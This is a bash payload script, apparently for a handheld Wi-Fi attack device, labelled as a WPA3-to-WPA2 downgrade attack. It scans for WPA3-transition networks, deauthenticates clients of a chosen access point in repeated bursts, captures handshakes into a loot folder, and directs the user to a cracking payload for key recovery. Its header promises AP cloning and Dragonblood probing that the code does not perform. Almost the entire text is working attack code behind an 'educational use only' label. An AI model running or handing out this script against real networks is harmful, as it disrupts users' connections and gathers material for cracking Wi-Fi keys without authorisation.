#!/bin/bash
# Title: Crypto Downgrade
# Author: bad-antics
# Description: Force WPA3 to WPA2 security downgrade via transition mode exploitation
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/downgrade"
mkdir -p "$LOOT_DIR"

PROMPT "CRYPTO DOWNGRADE

Exploit WPA3 transition mode to
force clients to WPA2 fallback.

Technique:
- Scan for WPA3-transition APs
- Clone AP with WPA2-only config
- Deauth clients from WPA3 AP
- Capture WPA2 handshakes
- Dragonblood SAE probing

EDUCATIONAL USE ONLY.

Press OK to configure."

# Check required tools
for tool in airodump-ng aireplay-ng hostapd; do
    command -v $tool >/dev/null || { ERROR_DIALOG "$tool not found!"; exit 1; }
done

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!\nRun: airmon-ng start wlan1"; exit 1; }

resp=$(CONFIRMATION_DIALOG "SCAN FOR WPA3 TARGETS?

This will scan for networks
using WPA3-Transition mode.

Duration: ~15 seconds

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning for WPA3 targets..."

SCAN_FILE="/tmp/downgrade_scan"
rm -f "${SCAN_FILE}"*.csv 2>/dev/null
timeout 15 airodump-ng "$MONITOR_IF" -w "$SCAN_FILE" --output-format csv 2>/dev/null

SPINNER_STOP

# Parse WPA3/SAE networks
WPA3_LIST=""
WPA3_COUNT=0
while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    privacy=$(echo "$privacy" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue

    # Look for SAE or WPA3 in auth/privacy
    if echo "$privacy $auth" | grep -qiE "SAE|WPA3"; then
        WPA3_COUNT=$((WPA3_COUNT + 1))
        channel=$(echo "$channel" | tr -d ' ')
        WPA3_LIST="${WPA3_LIST}${WPA3_COUNT}) ${essid} [${bssid}] Ch:${channel} ${privacy}\n"
    fi
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ $WPA3_COUNT -eq 0 ] && { PROMPT "NO WPA3 TARGETS

No WPA3/SAE networks found
in range. Only WPA3-transition
mode networks are vulnerable
to downgrade attacks."; exit 0; }

TARGET_NUM=$(NUMBER_PICKER "Select target (1-$WPA3_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

# Re-parse to get target details
IDX=0
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CH=""
while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    privacy=$(echo "$privacy" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    if echo "$privacy $auth" | grep -qiE "SAE|WPA3"; then
        IDX=$((IDX + 1))
        if [ $IDX -eq $TARGET_NUM ]; then
            TARGET_BSSID="$bssid"
            TARGET_ESSID="$essid"
            TARGET_CH=$(echo "$channel" | tr -d ' ')
            break
        fi
    fi
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "Invalid target!"; exit 1; }

DEAUTH_COUNT=$(NUMBER_PICKER "Deauth rounds:" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DEAUTH_COUNT=5 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/downgrade_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "LAUNCH DOWNGRADE?

Target: $TARGET_ESSID
BSSID: $TARGET_BSSID
Channel: $TARGET_CH
Deauth rounds: $DEAUTH_COUNT

This will attempt to force
WPA3 clients to WPA2 fallback.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting crypto downgrade attack..."
SPINNER_START "Running downgrade..."

echo "================================================================" > "$REPORT"
echo "         NULLSEC CRYPTO DOWNGRADE REPORT                       " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Target: $TARGET_ESSID ($TARGET_BSSID) Ch:$TARGET_CH" >> "$REPORT"
echo "" >> "$REPORT"

# Step 1: Set channel
iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null

# Step 2: Start handshake capture
HANDSHAKE_FILE="/tmp/downgrade_hs"
rm -f "${HANDSHAKE_FILE}"*.cap 2>/dev/null
airodump-ng "$MONITOR_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$HANDSHAKE_FILE" --output-format pcap 2>/dev/null &
DUMP_PID=$!

sleep 3

# Step 3: Deauth to force reconnection (clients may fall back to WPA2)
echo "--- DEAUTH PHASE ---" >> "$REPORT"
for ((r=1; r<=DEAUTH_COUNT; r++)); do
    LOG "Deauth round $r/$DEAUTH_COUNT"
    aireplay-ng -0 3 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    echo "  Round $r: Sent deauth burst" >> "$REPORT"
    sleep 5
done

# Step 4: Wait for reconnections
sleep 10

kill $DUMP_PID 2>/dev/null

# Step 5: Check for captured handshakes
echo "" >> "$REPORT"
echo "--- CAPTURE RESULTS ---" >> "$REPORT"
HANDSHAKE_FOUND=0
if ls "${HANDSHAKE_FILE}"*.cap 1>/dev/null 2>&1; then
    HS_SIZE=$(stat -f%z "${HANDSHAKE_FILE}"*.cap 2>/dev/null || stat -c%s "${HANDSHAKE_FILE}"*.cap 2>/dev/null || echo 0)
    cp "${HANDSHAKE_FILE}"*.cap "$LOOT_DIR/downgrade_${TIMESTAMP}.cap" 2>/dev/null
    if [ "$HS_SIZE" -gt 500 ]; then
        echo "  Capture file: ${HS_SIZE} bytes" >> "$REPORT"
        echo "  Possible handshakes captured" >> "$REPORT"
        HANDSHAKE_FOUND=1
    fi
fi

# Cleanup
killall airodump-ng aireplay-ng 2>/dev/null

echo "" >> "$REPORT"
echo "End: $(date)" >> "$REPORT"
echo "================================================================" >> "$REPORT"

SPINNER_STOP

if [ $HANDSHAKE_FOUND -eq 1 ]; then
    PROMPT "DOWNGRADE COMPLETE

Target: $TARGET_ESSID
Deauth rounds: $DEAUTH_COUNT
Handshake captured!

Saved to:
$LOOT_DIR/

Use WPACracker payload to
attempt key recovery."
else
    PROMPT "DOWNGRADE COMPLETE

Target: $TARGET_ESSID
Deauth rounds: $DEAUTH_COUNT
No WPA2 handshake captured.

Target may use WPA3-only mode
(not transition mode).

Report: $REPORT"
fi
